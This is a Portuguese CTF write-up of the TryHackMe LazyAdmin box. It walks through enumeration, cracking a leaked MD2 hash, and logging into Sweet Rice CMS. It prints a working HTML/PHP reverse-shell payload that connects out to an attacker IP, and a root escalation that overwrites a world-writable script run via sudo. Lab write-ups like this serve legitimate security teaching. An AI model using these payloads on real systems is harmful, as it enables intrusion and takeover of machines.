---
title: "LazyAdmin"
date: 2026-04-30
summary: "Enumeração do Sweet Rice CMS, credenciais em backup, reverse shell e escalada via script gravável."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Linux"
tags: ["CMS", "Backup", "PHP", "Sudo"]
draft: false
---

## Visão Geral

A máquina LazyAdmin apresenta um cenário prático envolvendo a enumeração de serviços web, descoberta de diretórios ocultos e exploração de credenciais expostas através de arquivos de backup de banco de dados. O acesso inicial é obtido por meio de uma vulnerabilidade de execução de código no CMS Sweet Rice, permitindo a injeção de *payloads* PHP para estabelecer uma *reverse shell*.

A etapa de escalada de privilégios explora vulnerabilidades clássicas de má configuração no ambiente Linux. A análise das permissões de superusuário revela que o `sudo` está configurado incorretamente, autorizando a execução de um script em Perl que, por sua vez, invoca um arquivo `.sh` com permissões de escrita abertas, garantindo acesso integral como usuário `root`.

## Reconhecimento

Inicialmente, executou-se uma varredura utilizando o **Nmap** para descobrir quais serviços estavam sendo executados no servidor alvo. O resultado indicou que as portas 22 (SSH) e 80 (HTTP) estavam abertas.

```bash
nmap -sC -sV -T4 <TARGET_IP>
# Output resumido:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
# 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

![Resultado do Nmap evidenciando as portas 22 e 80 abertas.](/images/writeups/lazy-admin/nmap.png)

Considerando a existência de uma aplicação web rodando na porta 80, o IP da máquina alvo foi adicionado ao arquivo `/etc/hosts` e associado ao domínio fictício `lazyadm.thm` para facilitar a navegação e a resolução de DNS local.

Em seguida, utilizou-se o **Feroxbuster** para realizar a força bruta de diretórios, aplicando um filtro pelos códigos de status HTTP 200, 301, 302 e 403 para reduzir o ruído.

```bash
feroxbuster -u http://lazyadm.thm -w /usr/share/wordlists/dirb/common.txt -s 200,301,302,403
# Output resumido:
# 301      9l       28w      314c http://lazyadm.thm/content
# 301      9l       28w      317c http://lazyadm.thm/content/as
# 301      9l       28w      318c http://lazyadm.thm/content/inc
```

![Parâmetros utilizados na varredura do Feroxbuster.](/images/writeups/lazy-admin/parametros-feroxbuster.png)

![Resultado do Feroxbuster mostrando os diretórios descobertos.](/images/writeups/lazy-admin/resultado-feroxbuster.png)

Aprofundando a enumeração nos diretórios descobertos, foi encontrada uma página de login em `/content/as/` e um diretório contendo arquivos críticos em `/content/inc/mysql_backup`, onde estava hospedado um arquivo `.sql`.

![Diretório contendo o arquivo de backup do banco de dados.](/images/writeups/lazy-admin/mysql-bakup.png)

Ao inspecionar o conteúdo do arquivo `.sql`, identificou-se um registro contendo o usuário `manager` e uma respectiva senha criptografada. O utilitário **HashID** foi empregado para analisar o formato do hash, sugerindo tratar-se de MD2. Utilizando uma ferramenta de quebra de hashes online, o valor foi revertido com sucesso, revelando a senha em texto claro: `Password123`.

![Identificação e quebra do hash MD2.](/images/writeups/lazy-admin/md2hash.png)

## Exploração

De posse das credenciais válidas, acessou-se a página encontrada em `/content/as/`, que revelou ser o painel de login do sistema de gerenciamento de conteúdo **Sweet Rice CMS**. O login foi efetuado com sucesso utilizando as credenciais `manager:Password123`.

![Página do painel de administrador do Sweet Rice CMS.](/images/writeups/lazy-admin/página-adm.png)

Averiguando as funcionalidades do painel, notou-se a capacidade de criar e gerenciar anúncios ("Ads"). Uma pesquisa na base de dados do Exploit-DB (<https://www.exploit-db.com/exploits/40700>) apontou que o módulo de anúncios do Sweet Rice é vulnerável à execução de códigos, pois permite injetar scripts nativos em PHP.

![Página de criação de anúncios (Ads) dentro do CMS.](/images/writeups/lazy-admin/ads-admin.png)

![Templates prontos demonstrando que a plataforma aceita e processa códigos PHP.](/images/writeups/lazy-admin/aceitaphp-pagina.png)

\

Para explorar a vulnerabilidade e obter a *reverse shell*, formulou-se um documento HTML malicioso que submete um código de conexão reversa na linguagem PHP via método POST, direcionado para a porta 1234.

```html
<html>
<body>
<form action="http://lazyadm.thm/content/inc/ads/ad_save.php" method="POST" id="exploit">
<input type="hidden" name="adk" value="shell" />
<textarea name="adv" style="display:none;">
<?php system("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.219.116\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"); ?>
</textarea>
<input type="submit" value="Submit" />
</form>
<script>
document.getElementById('exploit').submit();
</script>
</body>
</html>
```

Antes de acionar a carga útil, configurou-se um ouvinte na máquina atacante utilizando o **Netcat**:

```bash
nc -lvnp 1234
```

Após enviar o código através da interface do CMS, navegou-se até o diretório de anúncios gerados em `/content/inc/ads/`. Ao clicar no arquivo correspondente ao anúncio criado, o script PHP foi executado pelo servidor web, resultando no sucesso da conexão reversa. A primeira flag (`user.txt`) foi coletada no diretório `/home/itguy`.

## Escalada de Privilégios

Para escalar os acessos no sistema, o primeiro passo rotineiro é verificar quais privilégios o usuário atual possui em relação ao utilitário `sudo`.

```bash
sudo -l
# Matching Defaults entries for www-data on LazyAdmin:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
#
# User www-data may run the following commands on LazyAdmin:
#     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

![Saída do comando `sudo -l` revelando scripts com permissão administrativa sem senha.](/images/writeups/lazy-admin/sudo-l.png)

O comando indicou que qualquer usuário poderia executar o arquivo `/home/itguy/backup.pl` utilizando o `perl` sob o contexto do root, sem a necessidade de senha. Analisando o conteúdo do arquivo `backup.pl`, notou-se que o script executa diretamente um script secundário de shell localizado em `/etc/copy.sh`.

Ao avaliar as permissões desse script secundário, confirmou-se que ele estava vulnerável a modificações:

```bash
ls -l /etc/copy.sh
# -rw-rw-rw- 1 root root 81 Apr 30 2026 /etc/copy.sh
```

O arquivo `/etc/copy.sh` possuía permissões globais de escrita. Aproveitando essa falha estrutural, o conteúdo do arquivo foi substituído pelo comando de invocação de um *shell bash*:

```bash
echo '/bin/bash' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
whoami
# root
```

![Sobrescrita do arquivo `copy.sh` e obtenção do terminal interativo `root`.](/images/writeups/lazy-admin/root-copysh.png)

Como o script `backup.pl` foi executado com o comando `sudo`, as chamadas de sistema internas também herdaram esse nível de acesso, concedendo um terminal interativo completo de `root`. Com os privilégios máximos garantidos, o arquivo final pôde ser lido em `/root/root.txt`.

```bash
cat /root/root.txt
# [flag omitida para evitar spoilers]
```

![Leitura bem-sucedida da flag do superusuário.](/images/writeups/lazy-admin/root-flag.png)

## Conclusão

O comprometimento da máquina LazyAdmin ilustra perfeitamente a cadeia típica de ataques iniciada por falhas na proteção de arquivos confidenciais. O vazamento de um *backup* SQL expôs credenciais essenciais, que por sua vez facilitaram a exploração de um CMS defasado (Sweet Rice) suscetível a injeção de PHP via formulários de interface.

A subida de privilégios para `root` foi viabilizada por conta de uma falha humana na administração de sistemas: delegar permissões de superusuário no arquivo do `sudoers` atreladas a um binário que aciona rotinas de scripts secundários mantidos com permissão global de alteração. Essa combinação expõe o perigo de se não aplicar os conceitos de *Least Privilege* e demonstra a importância do controle severo de permissões de arquivo em sistemas baseados em Unix.

## Referências

- Exploit Database. *Sweet Rice 1.5.1 - Backup Disclosure*. Disponível em: <https://www.exploit-db.com/exploits/40700>.
- GTFOBins. *Perl -- GTFOBins*. Disponível em: <https://gtfobins.github.io/gtfobins/perl/>.
